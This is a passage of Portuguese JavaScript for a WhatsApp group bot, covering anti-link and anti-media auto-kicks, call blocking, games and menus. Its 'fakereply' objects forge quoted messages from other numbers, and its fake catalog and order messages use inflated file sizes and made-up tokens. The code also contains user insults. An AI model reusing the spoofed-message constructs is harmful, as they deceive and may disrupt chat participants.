if(isUrl(budy2) && isAntiLinkHard && isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return
linkgpp = await pl.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return
if(!isUrl(budy2)) return 
if(isGroupAdmins) return 
pl.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: [sender] }})
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
if(budy2.includes(`${linkgpp}`)) return 
}
if(isUrl(budy2) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return  
linkgpp = await pl.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return reply('Link do nosso grupo, n√£o irei remover.. ')
if(isGroupAdmins) return 
  pl.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: [sender] }})
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
reply('*Link detectado, punindo usu√°rio...*')
if(!JSON.stringify(groupMembers).includes(sender)) return
pl.groupParticipantsUpdate(from, [sender], 'remove')
} }

AntilinkHardF()
joguinhodavelha()

if(isUrl(body) && isAntilinkgp && isGroup && isBotGroupAdmins) {
if(!isAntilinkgp) return
if(!isUrl(body)) return 
if(isGroupAdmins) return reply("Voc√™ √© adm, n√£o removerei voc√™..") 
if(budy2.includes("chat.whatsapp.com/")){
if(!budy2.includes("chat.whatsapp.com/")) return
if(isBot) return 
linkgpp = await pl.groupInviteCode(from)
if(budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, n√£o irei remover.. ')  
reply('*Link de grupo detectado, punindo usu√°rio...*')
pl.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: [sender] }})
if(!JSON.stringify(groupMembers).includes(sender)) return
pl.groupParticipantsUpdate(from, [sender], 'remove')
}
}


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return pl.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: m})
await pl.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: m})
setTimeout(async function () {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return pl.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: m})
await pl.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: m})
setTimeout(async function () {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return pl.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: m})
await pl.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: m})
setTimeout(async function () {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

// ANTI NOTAS FAKES ======================>

if(isAntiNotas && body.toString().match(/(üí≥|üíé|üí∏|üíµ|üí∑|üí∂|ü™ô|üí∞|ü§ë|‚öñÔ∏è)/gi) && isBotGroupAdmins) {
if(type == 'stickerMessage') return
let verificar = body.toString().match(/(üí≥|üíé|üí∏|üíµ|üí∑|üí∂|ü™ô|üí∞|ü§ë|‚öñÔ∏è)/gi)
if (verificar && body.length < 100) return  
await pl.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: m})
setTimeout(async function () {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//FINALZIN ==============================>


//======(ANTI-VIDEO)========\\
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return pl.sendMessage(from,{text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: m})
await pl.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: m})
setTimeout(async function () {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return pl.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: m})
await pl.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: m})
setTimeout(async function () {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}
//=======================================\\

if(isGroup && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.key.fromMe) {
if(info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length || info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length - 1) { 
reply("MEMBRO COM MENSAGEM DE MARCA√á√ÉO DE TODOS DO GRUPO, POR CONTA DISSO VOU REMOVER DO GRUPO, QUALQUER COISA V√Å NO PV DO ADMINISTRADOR...")
pl.groupParticipantsUpdate(from, [sender], "remove")
}
}



//========(ANTI-PV-QUE-BLOQUEIA)======\\
if(isAntiPv && !isGroup && !SoDono && !m.key.fromMe && !isPremium){ 
reply(`[üö´] ùóîùó°ùóßùóúùó£ùó© ùó§ùó®ùóò ùóïùóüùó¢ùó§ùó®ùóòùóúùóî! [üö´]\nUsu√°rios que enviarem mensagem no privado, ser√° bloqueado pois antipv est√° ativo, fale com meu dono para solicitar o desbloqueio: wa.me/${numerodn}`)
setTimeout(async () => {
pl.updateBlockStatus(sender, 'block')
}, 1000)
return
}
//======================================\\
 
//======================================\\

const bemvindopv = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/welcomepv.json'))
if (!isCmd && !isGroup && !info.key.fromMe && !bemvindopv.includes(sender)) {    
        var menuzin = `ùêåùêÑùêçùêíùêÄùêÜùêÑùêå ùêÉùêÑ ùêÅùêéùêÄùêí ùêïùêàùêçùêÉùêÄùêí!\n*Ol√°*, prazer em conhec√™-lo(a), me chamo *${NomeDoBot}*. _Sou uma intelig√™ncia artificial 100% automatizado para ajudar em todo que for poss√≠vel nessa plataforma!_\n*Estou a sua disposi√ß√£o o dia todo, 24h horas por dia para te ajudar!* _Tenho +1mil comandos, entre eles de fazer figurinhas, pesquisa, download de m√∫sicas..._` 
        pl.sendMessage(from, {text: menuzin, footer: `Espero que goste e aproveite bastante!`, buttons: [{buttonId: `${prefix}criador`, buttonText: {displayText: 'ùó¶ùòÇùóΩùóºùóøùòÅùó≤'}, type: 1}, {buttonId: `${prefix}avaliar`, buttonText: {displayText: 'ùóîùòÉùóÆùóπùó∂ùóÆùóø'}, type: 1},  {buttonId: `${prefix}menu`, buttonText: {displayText: 'ùó†ùó≤ùóªùòÇ ùóñùóºùó∫ùóΩùóπùó≤ùòÅùóº'}, type: 1}]}, {quoted: selo})
bemvindopv.push(sender)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/welcomepv.json', JSON.stringify(bemvindopv))
}
 

//BAN CHATS/GRUPOS
if (isBanchat && !isGroupAdmins && !SoDono){
if (!isGroupAdmins && !SoDono) return
if (budy.toLowerCase().startsWith('unbangp')){
if (isCmd && !isBanchat && !isGroupAdmins) return reply(`Este grupo esta banido, ou seja n√£o estou ouvindo ningu√©m`)
let lfd = bancht.indexOf(from)
bancht.splice(lfd, 1)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
}
}



// ANTI_LIGAR \\

if(!isGroup && isAnticall) {
pl.ws.on('CB:call', async (B) => {
if (B.content[0].tag == 'offer') {
pl.sendMessage(B.content[0].attrs['call-creator'], { text: "N√£o pode ligar para o bot seu merda, voc√™ ser√° bloqueado..." }).then(() => { 
delay(4000)
pl.updateBlockStatus(B.content[0].attrs['call-creator'], "block") })
}
})
}


//=========(ANTIPV-QUE-S√ì-FALA)==========\\

if(!isGroup && !isPremium && !SoDono && !m.key.fromMe && banChats === true) return 
const atibot = m.isBaileys
if (atibot === true) return
//======================================\\
 
if(fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
var limitecaracteres_on = JSON.parse(fs.readFileSync(`./func/limitecaracteres/limite-c_${from}.json`))
var limitefl = limitecaracteres_on.limite
} else {
var limitefl = limitefll.limitefl
}



      const allForcaId = []
for(let obj of forca) allForcaId.push(obj.id)
const isPlayForca = allForcaId.indexOf(sender) >= 0 ? true : false

async function randompalavra() {
    return new Promise(async (resolve, reject) => {
fetch('https://www.palabrasaleatorias.com/palavras-aleatorias.php?fs=1&fs2=0&Submit=Nova+palavra',).then(async function (res, err) {
if(err) reject(err)    
var $ = cheerio.load(await res.text())
resolve($('body > center > center > table:nth-child(4) > tbody > tr > td > div')[0].children[0].data)
})
    }) 
}


//===================================== 

const enviarfiguimg = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifImg(buff, options)
} else {
 buffer = await imageToWebp(buff)
}
await pl.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }

//===================================== 

 const enviarfiguvid = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifVid(buff, options)
} else {
 buffer = await videoToWebp(buff)
}

await pl.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }    
 

//=======================\\

const mencionar = ( foto, texto, membro, ids ) => {
( ids == null || ids == undefined || ids == false ) ? pl.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } }) : pl.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } })
}

//========================\\

//-_-_-_-_--_-_-_-_-_--_-JSON-FUN√á√ïES-_-_-_-_-_-_-_-_-_-_-_-_\\
const { addVotoDuelo, delVotoDuelo } = require('./funcoes/votoduelo.js')

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

const votacao = JSON.parse(fs.readFileSync('./dados/votacao/votacao.json'))

const votacaoduelo = JSON.parse(fs.readFileSync('./dados/duelo/votacaoduelo.json'))
//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

//============(FUN√á√ïES)============\\

const isVoto = isGroup ? votacao.includes(from) : false

const isVotoDuelo = isGroup ? votacaoduelo.includes(from) : false

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

/** VOTA√á√ÉO ESTILO DUELO : VS **/

if( isGroup ) {

if (budy.toLowerCase() === 'um'){

let voto = JSON.parse(fs.readFileSync(`./dados/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./dados/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('Ol√° '+'@' + sender.split('@')[0] + '\n~ N√£o √© poss√≠vel votar duas vezes.', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '1'
})
fs.writeFileSync(`./dados/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `VOTA√á√ÉO...\n\nParticipante 1: @${_votos[0].votos.split('@')[0]}\nParticipante 2: @${_votos[0].votos2.split('@')[0]}\nMotivo da vota√ß√£o: ${_votos[0].razao}\nTotal de votos: ${voto.length}.\nDura√ß√£o: ${_votos[0].duracao} minuto.`
for(let i = 0; i < voto.length; i++) {
_voto +=  `\n\n========\nMembro: @${voto[i].participante.split('@')[0]}\nVotou em: ${voto[i].votacao}\n========`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
} else if (budy.toLowerCase() === 'dois'){
const voto = JSON.parse(fs.readFileSync(`./dados/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./dados/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('Ol√° '+'@' + sender.split('@')[0] + '\n~ N√£o √© possivel votar duas vezes.', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '2'
})
fs.writeFileSync(`./dados/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `VOTA√á√ÉO...\n\nParticipante 1: @${_votos[0].votos.split('@')[0]}\nParticipante 2: @${_votos[0].votos2.split('@')[0]}\nMotivo da vota√ß√£o: ${_votos[0].razao}\nTotal de votos: ${voto.length}.\nDura√ß√£o: ${_votos[0].duracao} minuto.`
for(let i = 0; i < voto.length; i++) {
_voto +=  `\n\n========\nMembro: @${voto[i].participante.split('@')[0]}\nVotou em: ${voto[i].votacao}\n========\n`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
}
}	


var nmrdnofc1 = numerodono

if(isGroup && fs.existsSync(`./func/afk/afk-@${nmrdnofc1}.json`)) {
if(budy.includes(`@${nmrdnofc1}`)) {
const tabelin = JSON.parse(fs.readFileSync(`./func/afk/afk-@${nmrdnofc1}.json`));  

txt = `- Oiee ${pushname} ${tempo}, o ${NickDono} Est√° ausente üôÅ\n\n - Desde: ${tabelin.Ausente_Desde} ü§†\n\n- üòá Mensagem de aus√™ncia : ${tabelin.Motivo_Da_Aus√™ncia}`

pl.sendMessage(from, {text: txt}, {quoted: info})
}
}

//======================================\\

//========(CONTADOR-DE-MENSAGENS)========\\

const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./fun√ß√µes de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./fun√ß√µes de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./fun√ß√µes de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}


//======================================\\

//===============(AUTO-BAN)=============\\
const dbids = []
for(i=0;i<adeuscara.length;++i) {
dbids.push(adeuscara[i].groupId)
}
const isAdeusCara = (isGroup && dbids.indexOf(from) >= 0) ? true : false

//======================================\\


//=====================================   

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|aceitar|Aceitar|Ok?|aceita|A√ß√£o|Posterior|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(Menos|A√ß√£o|rejeitar|n|ga(k.)?bisa)/i.test(m.text)) {
pl.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} terno de lixo, terno cancelado`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
pl.sendText(from, `O jogo foi enviado para conversar.

@${roof.p.split`@`[0]} e 
@${roof.p2.split`@`[0]}

Selecione o jogo em cada bate-papo"
clique https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) pl.sendText(roof.p, `Por favor, selecione \n\nPedraüóø\nPapelüìÑ\nTesoura‚úÇÔ∏è`, m)
if (!roof.pilih2) pl.sendText(roof.p2, `Por favor, selecione \n\nPedraüóø\nPapelüìÑ\Tesoura‚úÇÔ∏è`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) pl.sendText(from, `Ambos os jogadores n√£o t√™m inten√ß√£o de jogar,\njogo cancelado`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
pl.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} n√£o escolher um jogo, o jogo terminou`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /tesoura/i
let b = /pedra/i
let k = /papel/i
let reg = /^(tesoura|pedra|papel)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Voc√™ escolheu ${m.text} ${!roof.pilih2 ? `\n\nEsperando que o oponente escolha` : ''}`)
if (!roof.pilih2) pl.sendText(roof.p2, '_O oponente j√° escolheu_\nAgora √© sua vez.', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Voc√™ escolheu ${m.text} ${!roof.pilih ? `\n\nEsperando que o oponente escolha` : ''}`)
if (!roof.pilih) pl.sendText(roof.p, '_O oponente j√° escolheu_\nAgora √© sua vez.', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
pl.sendText(roof.asal, `_*Resultados do jogo*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Ganhou \n` : ` Perdido \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Ganhou \n` : ` Perdido \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//=====================================
const isFiltered = (sender) => !!usedCommandRecently.has(sender)


const addFilter = (sender) => {
    usedCommandRecently.add(sender)
    setTimeout(() => usedCommandRecently.delete(sender), 4000) 
}
//=====================================
		

//=====================================
	
	
	///////////ANTI-SPAM BY ITALU/////////
if (isCmd && isFiltered(sender) && !isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
const ff = `*Flood detectado, espere 2 segundos*`
return reply(ff)
}


if (isAntiLinkHard && isUrl(budy) && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM] - LINK', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${budy}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
return 
}


if (isCmd && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
const ff1 = `*Flood detectado, espere 2 segundos*`
return reply(ff1)
}		

	
	
//=====================================


//========MIDIA=============\\


//=============SELOS=============

//FAKEREPLY PRODUCT
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "120363042083601149@g.us" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": log0},
"title": "2A.TREM", 
"description": "MANUELA BOT", 
"currencyCode": "USD",
"priceAmount1000": "2000",
"retailerId": "My[P.L]",
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

//=====================================

//FAKEREPLY TROLI
const ftroli = {
key : {
participant : '556593065507@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 1,
status: 1,
surface : 1,
message: 'My[P.L]',
orderTitle: 'Bang',
thumbnail: log0,
sellerJid: '0@s.whatsapp.net'

}
}
}

//=====================================

//FAKEREPLY LOCATION
const flokasi = {
key : {
 participant : '556593065507@s.whatsapp.net'
},
message: {
locationMessage: {
name: 'BRASIL',
jpegThumbnail: log0
}
}
}

//=====================================

//FAKEREPLY DOCUMENT
const fdocs = {
key : {
 participant : '556593065507@s.whatsapp.net'
},
message: {
documentMessage: {
title: 'OL√Å BEM?', 
jpegThumbnail: log0
}
}
}

//=====================================

//FAKEREPLY GROUPINVITE
const fgclink = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "120363042083601149@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P", 
"caption": "OL√Å BOM JOGO", 
'jpegThumbnail': log0
}
}
}

//=====================================

//FAKEREPLY GIF
const fgif = {
key: { 
fromMe: false,
participant: `556593065507@s.whatsapp.net`, ...(from ? 
{ remoteJid: "120363042083601149@g.us" } : {}) 
},
message: { 
 "videoMessage": { 
 "title":"2A.TREM",
 "h": `Hmm`,
 'seconds': "30", 
 'gifPlayback': 'true', 
 'caption': 'MANUELA-BOT',
 'jpegThumbnail': log0
}
}
} 

//=====================================

//FAKEREPLY TEXT WITH THUMBNAIL
const fakey = (teks) => {
pl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `S√ì F√â üòé`,"body": `LINK GRUPO MANUELA-BOT OFC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./m√≠dia-ft-vd/fotos/akame.jpg`),"sourceUrl": "https://chat.whatsapp.com/ijpmhmhk96wc68nvglc9vk"}}}, { quoted: m})
}
const ftextt = {
key: { 
fromMe: false,
participant: `556593065507@s.whatsapp.net`, ...(from ? 
{ remoteJid: "6289643739077-1613049930@g.us" } : {}) 
},
message: { 
"extendedTextMessage": {
 "text":"OL√Å BEM? ",
"title": `Hmm`,
 'jpegThumbnail': log0
}
} 
}

//=====================================

//FAKEREPLY VN
const fvn = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "120363042083601149@g.us" } : {}) 
},
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "22:33",
"ptt": "true"
}
} 
}
l = 1
monospace = '```'


 
const enviarOrda = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid, // Change ID
"thumbnail": img, // Change the Image
"itemCount": itcount, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": title, // Change the title
"message": text, // Change Message
"sellerJid": sellers, // Change the seller
"token": tokens, // Change the token
"totalAmount1000": ammount, // Change the Total Amount
"totalCurrencyCode": "BRL", // Up to you
}
}), { userJid: jid })
pl.relayMessage(jid, order.message, { messageId: order.key.id})
}

const enviarCatalog = async(jid, titulo, texto, valor) => {
const catalog = generateWAMessageFromContent(jid, proto.Message.fromObject({
"productMessage": {
"product": {
	"productImage": {
			"url": "https://mmg.whatsapp.net/d/f/An6ssWQrEx3DYOvrXx5Ld5-1zzyW8DpRhZvr2ZCKrIu-.enc",
			"mimetype": "image/jpeg",
			"fileSha256": "fR9ZYUp6oPISWJNO6ywrBBNck0OpSw7FYL6XPXjKS6M=",
			"fileLength": "99999999999",
			"height": 50,
			"width": 50,
			"mediaKey": "/BQzqmWzeGOB1X7aPOCAxbVUeZL18bw3v9J7yA0Vn2Y=",
			"fileEncSha256": "C7LQFJx65AAS6sdALkCGNmDC+0NWilRBH8zHa+Lt4x4=",
			"directPath": "/v/t62.7118-24/35880876_730612661375500_4224816547459430339_n.enc?ccb=11-4&oh=01_AVxtkNgm-pIDHhEhvkfWXRnfU9WbYIckQFKZrtbZuAzGmw&oe=631A1B4E&_nc_hot=1660217709",
			"mediaKeyTimestamp": "1660217472",
			"jpegThumbnail": userppbuff
		},
		"productId": "7912700932134833",
		"title": titulo,
		"description": texto,
		"currencyCode": "BRL",
		"priceAmount1000": valor,
		"productImageCount": 2
		},
	"businessOwnerJid": "556593065507@s.whatsapp.net"
	}
}), { userJid: jid })
pl.relayMessage(jid, catalog.message, { messageId: catalog.key.id})
}


//========COMANDO POR FIGURA)=============//Guxtakkkj

switch (figura) {
  
case '126,144,14,209,134,19,16,172,160,105,78,199,46,234,131,2,254,136,7,73,186,10,51,219,101,246,177,136,232,17,179,1':
if(!isGroupAdmins) return reply('Se vc fosse adm eu removeria')
if(!isBotGroupAdmins) return reply('Se eu fosse adm eu removeria...')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
pl.groupParticipantsUpdate(from, [mentioned], "remove")  
break

}


//========BOT√ÉO DO AKINATOR)=============

switch(argsButton[0]) {
case 'finaki':
if(argsButton[1] == 'nao') {
reply('*Puxa n√£o foi desta vez üòî*')
akinator[0][from] = undefined
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/akinator.json', JSON.stringify(akinator, null, 2))
} else {
reply('*SABIA! EU VENCI OT√ÅRIO ü•≥*')
akinator[0][from] = undefined
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/akinator.json', JSON.stringify(akinator, null, 2))
}
break
case 'akinator':
if(argsButton[1] == 'nao') return reply('*At√© a pr√≥xima amigo*') 
if(akinator[0][from]) return reply('*Desculpe-me amigo alguem ja est√° jogando, aguarde pra chegar sua vez*')
akinator[0][from] = {
    id: from,
    player: sender,
    game: new Aki({region: 'pt'})
}
await akinator[0][from].game.start()
listMessage = {
    text: akinator[0][from].game.question,
    footer: 'Mostrar op√ß√µes',
    buttonText: 'Op√ß√µes',
    title: "Pergunta",
    sections: [{
title: 'Op√ß√µes',
rows: [{
rowId: `${prefix}respaki 0`,
title: 'Sim',
description: ''
},
{
rowId: `${prefix}respaki 1`,
title: 'N√£o',
description: ''
},{
rowId: `${prefix}respaki 2`,
title: 'N√£o sei',
description: ''
},{
rowId: `${prefix}respaki 3`,
title: 'Provavelmente sim',
description: ''
},
{
rowId: `${prefix}respaki 4`,
title: 'Provavelmente n√£o',
description: ''
}]
    }]
}
pl.sendMessage(from, listMessage)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/akinator.json', JSON.stringify(akinator, null, 2))
break
}

//========IN√çCIO DAS CASES=============


switch(command) {

//========MENUS=============

 case 'menu222':
await pl.sendMessage(from, { react: { text: `üëã`, key: m.key }})

let menutxt =
`
‚ñ¢ prefix:„Äé${prefix}„Äè‚Ä¢

DAVI √â GAY
`
reply('verifique seu privado...')
await enviarCatalog(from, '‚ú® ùñàùñëùñéùññùñöùñä ùñÜùññùñöùñé‚ö°', menutxt, 30000)
await enviarOrda(sender, menutxt, "81828", fs.readFileSync('./m√≠dia-ft-vd/fotos/akame.jpg'), `666`, `333`, "838388383@s.whatsapp.net", "AR7RorqhCmsQ+f+T/VSgwBx3gc81RZtizDRtI8rGDJ2O6Q==", "666")
break

case 'menugif':
var bio = await pl.fetchStatus(sender)
var bioo = bio.status
adivinhaa = info.key.id.length > 21 ? 'Android ü•¥' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE üîãüîå' : 'ZAP DA WEB üíª';

pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }}) 
sendButton5(from, menu(prefix, pushname, numerodn, bioo, adivinhaa, NomeDoBot, `Wa.me/${sender.split('@')[0]}`), fake, await pl.createMessage(from, {video: {url: "./m√≠dia-ft-vd/video/menu.mp4", caption: menu}, gifPlayback: true}))

break 

case 'menu':
var bio = await pl.fetchStatus(sender)
var bioo = bio.status
adivinhaa = info.key.id.length > 21 ? 'Android ü•¥' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE üîãüîå' : 'ZAP DA WEB üíª';

pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
bla = fs.readFileSync('audios/menucmd.mp3')
pl.sendMessage(from, {audio: bla, mimetype: 'audio/mp4', ptt:true}, {quoted: fvn})
sendBimg(from, `${logo}`, menu(prefix, pushname, numerodn, bioo, adivinhaa, NomeDoBot, `Wa.me/${sender.split('@')[0]}`), ` ${NomeDoBot}  `, 
